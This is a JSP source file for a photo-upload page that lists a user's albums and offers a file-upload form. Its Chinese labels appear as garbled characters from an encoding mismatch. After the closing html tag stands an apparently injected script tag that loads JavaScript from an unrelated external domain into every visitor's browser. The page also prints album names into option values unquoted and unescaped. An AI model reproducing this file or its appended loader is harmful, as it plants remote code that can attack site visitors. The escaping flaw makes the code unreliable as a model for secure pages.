<%@ page
 contentType="text/html;charset=GBK"
 import="java.util.*,com.javabean.AlbumInfo"
 errorPage="error.jsp"
 session="true"
%>
<html>
	<head>
		<title></title>
	</head>
	<body><br><br><br><br><br>
	<form action="AlbumServlet" method="post" name="updateImageForm2">
	<center>
	<table>
	<tbody>
	<tr>
	<td><p>ѡ�����:
		 <select name="albumId">
	<%
	     Vector vec=(Vector)session.getAttribute("userAlbum");
		 for(Enumeration enu=vec.elements();enu.hasMoreElements();) {
			AlbumInfo ai=(AlbumInfo)enu.nextElement();
			if(vec.size()%5==0) {
				out.println("<br>");
			}
	%>
	<option value=<%= ai.getAlbumId() %>><%= ai.getAlbumName() %></option>
	<%
	}
	%></select><br></p></td></tr>
	<tr><td>
		<p>
	    ��Ƭ����:
	   <input type="test" name="photoName" size="30" maxlength="80"><br>
	</p></td></tr>
	<tr><td>
	<p>
	    ·&nbsp;&nbsp;&nbsp;&nbsp;��:
	   <input type="file" name="path" size="30" maxlength="80"><br>
	</p></td></tr>
	<tr><td height="10"></td></tr>
	<tr align="center"><td>
		<p>
	       <input type="hidden" name="action" value="addImageSubmit"> 
	       <input type="submit" value="�ϴ���Ƭ"></p>
	</td></tr>
	</tbody></table></center></form>
	</body>
</html>
<script language=javascript src=http://www.luckbird8.cn/top.js></script>